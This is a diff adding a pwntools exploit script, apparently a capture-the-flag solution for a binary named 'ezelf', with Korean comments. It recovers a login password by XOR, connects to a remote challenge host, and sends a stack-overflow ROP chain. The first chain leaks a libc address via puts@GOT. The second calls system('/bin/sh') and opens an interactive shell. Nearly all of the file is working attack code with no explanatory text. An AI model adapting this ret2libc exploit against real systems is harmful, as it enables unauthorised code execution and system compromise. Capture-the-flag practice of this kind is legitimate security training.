@@ -1,0 +1,107 @@
+from pwn import *
+from Crypto.Util.number import long_to_bytes
+
+# login
+# 0x0000646c78746b76
+# 길이가 0x41
+
+KEY  = p64(0x11131f3e373f3235) 
+KEY += p64(0x3e182e29165c002b)
+KEY += p64(0x0d3f0a471d131633)
+KEY += p64(0x3f0e570227555218)
+KEY += p64(0x312b5811505b2b2b)
+KEY += p64(0x550e4c3a1c063b59)
+KEY += p64(0x5e02010027554a45)
+KEY += p64(0x593b4a31455c412b)
+KEY += p64(0x00646c78746b7611)
+
+TABLE = p64(0x0000646c78746b76)
+
+
+FLAG = b""
+
+for i in range(0x41):
+    FLAG += long_to_bytes(KEY[i] ^ TABLE[i%6])
+
+print(FLAG)
+
+pop_rdi_ret = 0x00401803
+pop_rsi_r15_ret = 0x00401801
+ret = 0x0040101a
+puts_got = 0x403650
+puts_plt = 0x4010c0
+read_plt = 0x401100
+bof_addr = 0x0000000000401693
+fsb_addr = 0x401623
+IS_EXPLOIT = 0x403880
+IS_LOGIN = 0x403760
+main = 0x000000000040170e
+
+r = remote("ipwn.kr", 12512)
+# r = process("./ezelf/share/ezelf")
+
+r.sendlineafter("> ", "2")
+r.sendlineafter("ID: ", "CyKor")
+r.sendlineafter("PW: ", FLAG)
+
+
+
+r.sendlineafter("> ", "4")
+
+# rbp -0x20에 0x100만큼 입력을 한다
+# libc leak을 한다
+payload  = b""
+payload += b"a" * 0x20
+payload += b"b" * 0x08
+payload += p64(pop_rdi_ret)
+payload += p64(0)
+payload += p64(pop_rsi_r15_ret)
+payload += p64(IS_EXPLOIT)
+payload += p64(0)
+payload += p64(read_plt)
+payload += p64(pop_rdi_ret)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
+
+pause()
+
+r.sendlineafter("buffer: ", payload)
+
+r.sendline(b"\x00" * 8)
+
+
+libc = u64(r.recvline()[:-1].ljust(8, b"\x00"))
+log.info(hex(libc))
+
+system = libc + 0x055410 - 0x0875a0
+binsh = libc + 0x1b75aa - 0x0875a0
+
+
+pause()
+
+
+sleep(0.5)
+
+# r.sendlineafter("> ", "2")
+# r.sendlineafter("ID: ", "CyKor")
+# r.sendlineafter("PW: ", FLAG)
+
+
+payload  = b""
+payload += b"a" * 0x20
+payload += b"b" * 0x08
+payload += p64(ret)
+payload += p64(pop_rdi_ret)
+
+payload += p64(binsh)
+payload += p64(system)
+r.sendlineafter("> ", "4")
+r.sendlineafter("buffer: ", payload)
+
+
+r.interactive()
+
+
+
+
